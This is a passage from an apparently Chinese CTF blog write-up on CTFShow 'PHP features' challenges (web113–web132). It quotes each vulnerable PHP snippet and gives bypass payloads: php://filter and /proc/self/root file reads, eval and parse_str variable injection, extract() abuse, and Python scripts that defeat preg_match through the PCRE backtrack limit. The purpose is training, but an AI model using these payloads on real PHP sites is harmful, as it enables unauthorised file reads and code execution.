\"hacker!\";\n}\n</code></pre>\n<pre><code>在linux中/proc/self/root是指向根目录的，也就是如果在命令行中输入\nls /proc/self/root，其实显示的内容是根目录下的内容，多次重复后绕过is_file.\n\n在php中，require_once在调用时php会检查该文件是否已经被包含过，如果是则不会再次包含\n</code></pre>\n<pre><code>?file=compress.zlib://flag.php\t\t//压缩\n\n?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php\n</code></pre>\n<h2 id=\"web114\"><a href=\"#web114\" class=\"headerlink\" title=\"web114\"></a>web114</h2><pre><code>error_reporting(0);\nhighlight_file(__FILE__);\nfunction filter($file){\n    if(preg_match('/compress|root|zip|convert|\\.\\.\\/|http|https|data|data|rot13|base64|string/i',$file)){\n        die('hacker!');\n    }else{\n        return $file;\n    }\n}\n$file=$_GET['file'];\necho \"师傅们居然tql都是非预期 哼！\";\nif(! is_file($file)){\n    highlight_file(filter($file));\n}else{\n    echo \"hacker!\";\n} 师傅们居然tql都是非预期 哼！\n</code></pre>\n<pre><code>?file=php://filter/resource=flag.php\n</code></pre>\n<h2 id=\"web115\"><a href=\"#web115\" class=\"headerlink\" title=\"web115\"></a>web115</h2><pre><code>include('flag.php');\nhighlight_file(__FILE__);\nerror_reporting(0);\nfunction filter($num){\n    $num=str_replace(\"0x\",\"1\",$num);\n    $num=str_replace(\"0\",\"1\",$num);\n    $num=str_replace(\".\",\"1\",$num);\n    $num=str_replace(\"e\",\"1\",$num);\n    $num=str_replace(\"+\",\"1\",$num);\n    return $num;\n}\n$num=$_GET['num'];\nif(is_numeric($num) and $num!=='36' and trim($num)!=='36' and filter($num)=='36'){\n    if($num=='36'){\n        echo $flag;\n    }else{\n        echo \"hacker!!\";\n    }\n}else{\n    echo \"hacker!!!\";\n} hacker!!!\n</code></pre>\n<pre><code>is_numeric() 函数用于检测变量是否为数字或数字字符串。\nnum不能是36\n\ntrim(string,charlist)\nstring\t        必需。规定要检查的字符串。\ncharlist\t    可选。规定从字符串中删除哪些字符。如果省略该参数，则移除\n</code></pre>\n<pre><code>测试\n\nfor ($i=0; $i &lt;=128 ; $i++) { \n        $x=chr($i).'1';\n       if(trim($x)!=='1' &amp;&amp;  is_numeric($x)){\n            echo urlencode(chr($i)).\"\\n\";\n       }\n    }\n    \n输出\n%0C(空格)、%2B（+号）、-、.（点）、0、1、2、3、4、5、6、7、8、9\n\n+  .  被过滤   -号不能用（-36）\n发现除了+-.号以外还有只剩下%0c也就是换页符了，所以这个题只有这一个固定的解了。\npayload:num=%0c36\n</code></pre>\n<h2 id=\"web123\"><a href=\"#web123\" class=\"headerlink\" title=\"web123\"></a>web123</h2><pre><code>error_reporting(0);\nhighlight_file(__FILE__);\ninclude(\"flag.php\");\n$a=$_SERVER['argv'];\n$c=$_POST['fun'];\nif(isset($_POST['CTF_SHOW'])&amp;&amp;isset($_POST['CTF_SHOW.COM'])&amp;&amp;!isset($_GET['fl0g'])){\n    if(!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\{|\\}|\\\"|\\'|\\,|\\.|\\;|\\?/\", $c)&amp;&amp;$c&lt;=18){\n         eval(\"$c\".\";\");  \n         if($fl0g===\"flag_give_me\"){\n             echo $flag;\n         }\n    }\n}\n?&gt;\n</code></pre>\n<pre><code>$_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。\n'argv'\n    传递给该脚本的参数的数组。当脚本以命令行方式运行时，argv 变量传递给程序 C 语言样式的命令行参数。当通过 GET 方式调用时，该变量包含query string。 \n即$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]=（get传参？后面的值）\n例如：\n?$fl0g=flag_give_me;   //get\n$_SERVER[‘argv’][0]=$_SERVER[‘QUERY_STRING’]=\"$fl0g=flag_give_me;\"\n</code></pre>\n<pre><code>PHP变量命名规则：\n只能包含：字母、数字、下划线，其中，只能以字母、下划线开头\n同时GET或POST方式传进去的变量名,会自动将空格+ . [转换为_\n特殊字符[, GET或POST方式传参时,变量名中的[也会被替换为_,但其后的字符就不会被替换了\n如 CTF[SHOW.COM=&gt;CTF_SHOW.COM\n</code></pre>\n<pre><code>payload1:\nCTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=echo $flag\t\n\npayload2:\n?$fl0g=flag_give_me;                           #GET  \nCTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=eval($a[0])      #POST  \n\npayload3:\n?a=1+fl0g=flag_give_me                         #GET \nCTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=parse_str($a[1])   #POST \n\nparse_str — 将字符串解析成多个变量\n</code></pre>\n<h2 id=\"web125\"><a href=\"#web125\" class=\"headerlink\" title=\"web125\"></a>web125</h2><pre><code>error_reporting(0);\nhighlight_file(__FILE__);\ninclude(\"flag.php\");\n$a=$_SERVER['argv'];\n$c=$_POST['fun'];\nif(isset($_POST['CTF_SHOW'])&amp;&amp;isset($_POST['CTF_SHOW.COM'])&amp;&amp;!isset($_GET['fl0g'])){\n    if(!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\{|\\}|\\\"|\\'|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print/i\", $c)&amp;&amp;$c&lt;=16){\n         eval(\"$c\".\";\");\n         if($fl0g===\"flag_give_me\"){\n             echo $flag;\n         }\n    }\n}\n?&gt;\n</code></pre>\n<pre><code>?$fl0g=flag_give_me;                           #GET  \nCTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=eval($a[0])      #POST  \n</code></pre>\n<h2 id=\"web126\"><a href=\"#web126\" class=\"headerlink\" title=\"web126\"></a>web126</h2><pre><code>error_reporting(0);\nhighlight_file(__FILE__);\ninclude(\"flag.php\");\n$a=$_SERVER['argv'];\n$c=$_POST['fun'];\nif(isset($_POST['CTF_SHOW'])&amp;&amp;isset($_POST['CTF_SHOW.COM'])&amp;&amp;!isset($_GET['fl0g'])){\n    if(!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\{|\\}|\\\"|\\'|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i\", $c) &amp;&amp; strlen($c)&lt;=16){\n         eval(\"$c\".\";\");  \n         if($fl0g===\"flag_give_me\"){\n             echo $flag;\n         }\n    }\n}\n</code></pre>\n<pre><code>payload1:\n?$fl0g=flag_give_me;                           #GET  \nCTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=eval($a[0])      #POST  \n\npayload2:\n?a=1+fl0g=flag_give_me                         #GET \nCTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=parse_str($a[1])   #POST \n</code></pre>\n<h2 id=\"web127\"><a href=\"#web127\" class=\"headerlink\" title=\"web127\"></a>web127</h2><pre><code>error_reporting(0);\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\n$ctf_show = md5($flag);\n$url = $_SERVER['QUERY_STRING'];\n\n//特殊字符检测\nfunction waf($url){\n    if(preg_match('/\\`|\\~|\\!|\\@|\\#|\\^|\\*|\\(|\\)|\\\\$|\\_|\\-|\\+|\\{|\\;|\\:|\\[|\\]|\\}|\\'|\\\"|\\&lt;|\\,|\\&gt;|\\.|\\\\\\|\\//', $url)){\n        return true;\n    }else{\n        return false;\n    }\n}\n\nif(waf($url)){\n    die(\"嗯哼？\");\n}else{\n    extract($_GET);\n}\n\nif($ctf_show==='ilove36d'){\n    echo $flag;\n}\n</code></pre>\n<pre><code>extract — 从数组中将变量导入到当前的符号表\n?ctf show=ilove36d=&gt;$ctf show=ilove36d\n\nget传参，并赋值给$url，让waf($url)==false，执行extract($_GET);，把get传入的值导入，然后过if语句就o了\n</code></pre>\n<pre><code>payload1\n在web123就了解过，点或空格会被转化为下划线，由于点被过滤 ，所以可以用上空格。\n?ctf show=ilove36d\n\npayload2\n$_SERVER['QUERY_STRING'];获取的查询语句是服务端还没url解码之前的字符串，所以对_进行一次url编码也能绕过。\n?ctf%5fshow=ilove36d\n</code></pre>\n<h2 id=\"web128\"><a href=\"#web128\" class=\"headerlink\" title=\"web128\"></a>web128</h2><pre><code>include(\"flag.php\");\nhighlight_file(__FILE__);\n\n$f1 = $_GET['f1'];\n$f2 = $_GET['f2'];\n\nif(check($f1)){\n    var_dump(call_user_func(call_user_func($f1,$f2)));\n}else{\n    echo \"嗯哼？\";\n}\n\nfunction check($str){\n    return !preg_match('/[0-9]|[a-z]/i', $str);\n</code></pre>\n<pre><code>call_user_func 回调函数\nPHP中所讲的回调函数，其实就是指调用函数时不是向函数中传递标准的变量作为参数，而是将另一个函数作为参数，传递到调用的函数中，回调函数也就是这个作为参数的函数。\n$str = call_user_func($v1,$s);就是将s作为v1函数的参数\n</code></pre>\n<pre><code>_()是gettext()的拓展函数\n在开启相关设定后，_(\"0\")等价于gettext(\"0\")，且就返回参数0   //_=gettext\n\n&lt;?php\necho gettext(666);   //输出 666\necho _(\"666\");\t\t//输出 666\n?&gt;\n\n//https://www.cnblogs.com/lost-1987/articles/3309693.html\n\nget_defined_vars — 返回由所有已定义变量所组成的数组 \n</code></pre>\n<pre><code>var_dump(call_user_func(call_user_func($f1,$f2)));\n=&gt; var_dump(call_user_func(call_user_func(_,'get_defined_vars')));\n=&gt; var_dump(call_user_func(get_defined_vars));\n</code></pre>\n<pre><code>f1=_&amp;f2=get_defined_vars\n</code></pre>\n<p><img src=\"D:\\Documents\\PHP特性.assets\\image-20221020235933476.png\" alt=\"image-20221020235933476\"></p>\n<h2 id=\"web129\"><a href=\"#web129\" class=\"headerlink\" title=\"web129\"></a>web129</h2><pre><code>highlight_file(__FILE__);\nif(isset($_GET['f'])){\n    $f = $_GET['f'];\n    if(stripos($f, 'ctfshow')&gt;0){\n        echo readfile($f);\n    }\n</code></pre>\n<pre><code>stripos(string $haystack, string $needle, int $offset = 0)查找字符串在另一字符串中第一次出现的位置（不区分大小写）\nint 返回在字符串 haystack 中 needle 首次出现的数字位置，找的是needle与 strpos() 不同，stripos() 不区分大小写\n如果未发现 needle 将返回 false。 //后面会用到\n</code></pre>\n<pre><code>readfile(string $filename, bool $use_include_path = false, resource $context = ?): int\n 读取文件并写入到输出缓冲。 \n \n参数\nfilename\n    要读取的文件名。\nuse_include_path\n    想要在 include_path 中搜索文件，可使用这个可选的第二个参数，设为 true。\ncontext\n    Stream 上下文（context） resource。\n返回值\n成功时返回从文件中读入的字节数， 或者在失败时返回 false\n</code></pre>\n<p>filter伪协议支持多种编码方式，无效的就被忽略掉了</p>\n<pre><code>?f=php://filter/read=convert.base64-encode|ctfshow/resource=flag.php\n?f=php://filter/|ctfshow/resource=flag.php\n?f=/ctfshow/../var/www/html/flag.php\n?f=./ctfshow/../flag.php\n</code></pre>\n<h2 id=\"web130\"><a href=\"#web130\" class=\"headerlink\" title=\"web130\"></a>web130</h2><pre><code>include(\"flag.php\");\nif(isset($_POST['f'])){\n    $f = $_POST['f'];\n\n    if(preg_match('/.+?ctfshow/is', $f)){//不能匹配到/.+?ctfshow/\n        die('bye!');\n    }\n    if(stripos($f, 'ctfshow') === FALSE){//传的$f中有ctfshow\n        die('bye!!');\n    }\n\n    echo $flag;\n\n}\n</code></pre>\n<pre><code>payload1\nPCRE回溯次数限制\nhttps://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html\nPHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限pcre.backtrack_limit。我们可以通过var_dump(ini_get(‘pcre.backtrack_limit’));的方式查看当前环境下的上限\n//1000000次\n如果回溯次数超过了100万，preg_match返回的非1和0，而是false。\n\n这样也就达到绕过preg_match的目的，通过发送超长字符串的方式，使正则执行失败：\n\nimport requests\n\nurl=\"http://d982e941-58a2-4bbb-8e2e-298bdb38ac17.challenge.ctf.show/\"\n\ndata={\"f\":\"1111\"*250000+\"ctfshow\"}\n\nresponse=requests.post(url=url,data=data)\nprint(response.text)\n</code></pre>\n<h2 id=\"web131\"><a href=\"#web131\" class=\"headerlink\" title=\"web131\"></a>web131</h2><pre><code>include(\"flag.php\");\nif(isset($_POST['f'])){\n    $f = (String)$_POST['f'];\n\n    if(preg_match('/.+?ctfshow/is', $f)){\n        die('bye!');\n    }\n    if(stripos($f,'36Dctfshow') === FALSE){\n        die('bye!!');\n    }\n\n    echo $flag;\n</code></pre>\n<pre><code>import requests\n\nurl=\"http://46824a94-4dcc-45df-9cde-cbd6343c7e49.challenge.ctf.show/\"\n\ndata={\"f\":\"1111\"*250000+\"36Dctfshow\"}\n\nresponse=requests.post(url=url,data=data)\nprint(response.text)\n</code></pre>\n<h2 id=\"web132\"><a href=\"#web132\" class=\"headerlink\" title=\"web132\"></a>web132</h2><pre><code>if(isset($_GET['username']) &amp;&amp; isset($_GET['password']) &amp;&amp; isset($_GET['code'])){\n    $username = (String)$_GET['username'];\n    $password = (String)$_GET['password'];\n    $code = (String)$_GET['code'];\n\n    if($code === mt_rand(1,0x36D) &amp;&amp; $password === $flag || $username ===\"admin\"){\n        \n        if($code == 'admin'){\n            echo $flag;\n        }\n        \n    }\n}\n</code></pre>\n<pre><code>php中&amp;&amp;和||运算符应用 访问/robots.txt,之后访问/admin，获得源代码\n\n对于“与”（&amp;&amp;） 运算： x &amp;&amp; y 当x为false时，直接跳过，不执行y； 对于“或”（||） 运算 ： x||y 当x为true时，直接跳过，不执行y。 \n\npayload: ?username=admin&amp;password=admin&amp;code=admin\n</code></pre>\n<h2 id=\"web133\"><a href=\"#web133\" class=\"headerlink\" title=\"web133\"></a>web133</h2><h2 id=\"web134\"><a href=\"#web134\" class=\"headerlink\" title=\"web134\"></a>web134</h2><h2 id=\"web135\"><a href=\"#web135\" class=\"headerlink\" title=\"web135\"></a>web135</h2><h2 id=\"web135-1\"><a href=\"#web135-1\" class=\"headerlink\" title=\"web135\"></a>web135</h2><h2 id=\"web137\"><a href=\"#web137\" class=\"headerlink\" title=\"web137\"></a>web137</h2><h2 id=\"web138\"><a href=\"#web138\" class=\"headerlink\" title=\"web138\"></a>web138</h2><h2 id=\"web139\"><a href=\"#web139\" class=\"headerlink\" title=\"web139\"></a>web139</h2><h2 id=\"web140\"><a href=\"#web140\" class=\"headerlink\" title=\"web140\"></a>web140</h2><h2 id=\"web141\"><a href=\"#web141\" class=\"headerlink\" title=\"web141\"></a>web141</h2><h2 id=\"web142\"><a href=\"#web142\" class=\"headerlink\" title=\"web142\"></a>web142</h2><h2 id=\"web143\"><a href=\"#web143\" class=\"headerlink\" title=\"web143\"></a>web143</h2><h2 id=\"web144\"><a href=\"#web144\" class=\"headerlink\" title=\"web144\"></a>web144</h2><h2 id=\"web145\"><a href=\"#web145\" class=\"headerlink\" title=\"web145\"></a>web145</h2><h2 id=\"web146\"><a href=\"#web146\" class=\"headerlink\" title=\"web146\"></a>web146</h2><h2 id=\"web147\"><a href=\"#web147\" class=\"headerlink\" title=\"web147\"></a>web147</h2><h2 id=\"web148\"><a href=\"#web148\" class=\"headerlink\" title=\"web148\"></a>web148</h2><h2 id=\"web149\"><a href=\"#web149\" class=\"headerlink\" title=\"web149\"></a>web149</h2><h2 id=\"web150\"><a href=\"#web150\" class=\"headerlink\" title=\"web150\"></a>web150</h2>","text":"PHP特性web89利用数组进行绕过 include(\"flag.php\"); highlight_file(__FILE__); if(isset($_GET['num'])){ $num = $_GET['num']; if(preg_match(\"/[0-9]/\", $nu...","link":"","photos":[],"count_time":{"symbolsCount":"26k","symbolsTime":"23 mins."},"categories":[{"name":"CTFShow","slug":"CTFShow","count":4,"path":"api/categories/CTFShow.json"}],"tags":[{"name":"CTFShow","slug":"CTFShow","count":4,"path":"api/tags/CTFShow.json"},{"name":"刷题","slug":"刷题","count":6,"path":"api/tags/刷题.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#PHP%E7%89%B9%E6%80%A7\"><span class=\"toc-text\">PHP特性</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web89\"><span class=\"toc-text\">web89</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web90\"><span class=\"toc-text\">web90</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web91\"><span class=\"toc-text\">web91</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web92\"><span class=\"toc-text\">web92</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web93\"><span class=\"toc-text\">web93</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web94\"><span class=\"toc-text\">web94</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web95\"><span class=\"toc-text\">web95</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web96\"><span class=\"toc-text\">web96</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web97\"><span class=\"toc-text\">web97</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web98\"><span class=\"toc-text\">web98</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web99\"><span class=\"toc-text\">web99</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web100\"><span class=\"toc-text\">web100</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web101\"><span class=\"toc-text\">web101</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web102\"><span class=\"toc-text\">web102</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web103\"><span class=\"toc-text\">web103</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web104\"><span class=\"toc-text\">web104</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web105\"><span class=\"toc-text\">web105</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web106\"><span class=\"toc-text\">web106</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web107\"><span class=\"toc-text\">web107</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web108\"><span class=\"toc-text\">web108</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web109\"><span class=\"toc-text\">web109</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web110\"><span class=\"toc-text\">web110</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web111\"><span class=\"toc-text\">web111</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web112\"><span class=\"toc-text\">web112</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web113\"><span class=\"toc-text\">web113</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web114\"><span class=\"toc-text\">web114</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web115\"><span class=\"toc-text\">web115</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web123\"><span class=\"toc-text\">web123</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web125\"><span class=\"toc-text\">web125</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web126\"><span class=\"toc-text\">web126</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web127\"><span class=\"toc-text\">web127</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web128\"><span class=\"toc-text\">web128</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web129\"><span class=\"toc-text\">web129</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web130\"><span class=\"toc-text\">web130</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web131\"><span class=\"toc-text\">web131</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web132\"><span class=\"toc-text\">web132</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web133\"><span class=\"toc-text\">web133</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web134\"><span class=\"toc-text\">web134</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web135\"><span class=\"toc-text\">web135</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web135-1\"><span class=\"toc-text\">web135</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web137\"><span class=\"toc-text\">web137</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web138\"><span class=\"toc-text\">web138</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web139\"><span class=\"toc-text\">web139</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web140\"><span class=\"toc-text\">web140</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web141\"><span class=\"toc-text\">web141</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web142\"><span class=\"toc-text\">web142</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web143\"><span class=\"toc-text\">web143</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web144\"><span class=\"toc-text\">web144</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web145\"><span class=\"toc-text\">web145</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web146\"><span class=\"toc-text\">web146</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web147\"><span class=\"toc-text\">web147</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web148\"><span class=\"toc-text\">web148</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web149\"><span class=\"toc-text\">web149</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web150\"><span class=\"toc-text\">web150</span></a></li></ol></li></ol>","author":{"name":"Yum1","slug":"blog-author","avatar":"https://raw.githubusercontent.com/Yum1Yum1/images/master/blogImg/IMG_5282(20220929-023350).JPG","link":"/","description":"开卷","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"CTFShow-反序列化","uid":"906b675e8148c0a7e7c9e23d61b36a42","slug":"PHP反序列化","date":"2022-11-30T10:49:36.000Z","updated":"2022-11-29T17:09:48.494Z","comments":true,"path":"api/articles/PHP反序列化.json","keywords":null,"cover":"https://raw.githubusercontent.com/Yum1Yum1/images/master/blogImg/IMG_5282(20220929-023350).JPG","text":"PHP反序列化web254include('flag.php'); class ctfShowUser{ public $username='xxxxxx'; public $password='xxxxxx'; public $isVip=false; public funct...","link":"","photos":[],"count_time":{"symbolsCount":"12k","symbolsTime":"11 mins."},"categories":[{"name":"CTFShow","slug":"CTFShow","count":4,"path":"api/categories/CTFShow.json"}],"tags":[{"name":"CTFShow","slug":"CTFShow","count":4,"path":"api/tags/CTFShow.json"},{"name":"刷题","slug":"刷题","count":6,"path":"api/tags/刷题.json"}],"author":{"name":"Yum1","slug":"blog-author","avatar":"https://raw.githubusercontent.com/Yum1Yum1/images/master/blogImg/IMG_5282(20220929-023350).JPG","link":"/","description":"开卷","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"Uploads-Labs","uid":"acb63dab4b0502339bea24ac6d81cc8a","slug":"Upload-Labs","date":"2022-11-30T10:49:36.000Z","updated":"2022-12-01T12:29:57.793Z","comments":true,"path":"api/articles/Upload-Labs.json","keywords":null,"cover":"https://raw.githubusercontent.com/Yum1Yum1/images/master/blogImg/IMG_5282(20220929-023350).JPG","text":"Upload-Labs Pass-011使用一句话木马，直接进行上传，发现php后缀被限制，修改为jpg后缀重新上传，上传成功。 使用Burpsuite抓包 将jpg后缀修改为php，发包 就可以将php为后缀的文件上传到网站，使用蚁剑，复制图片地址 2直接查看源码，发现就是js...","link":"","photos":[],"count_time":{"symbolsCount":"1.5k","symbolsTime":"1 mins."},"categories":[{"name":"CTF","slug":"CTF","count":3,"path":"api/categories/CTF.json"}],"tags":[{"name":"CTF","slug":"CTF","count":3,"path":"api/tags/CTF.json"},{"name":"文件上传漏洞","slug":"文件上传漏洞","count":1,"path":"api/tags/文件上传漏洞.json"}],"author":{"name":"Yum1","slug":"blog-author","avatar":"https://raw.githubusercontent.com/Yum1Yum1/images/master/blogImg/IMG_5282(20220929-023350).JPG","link":"/","description":"开卷","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}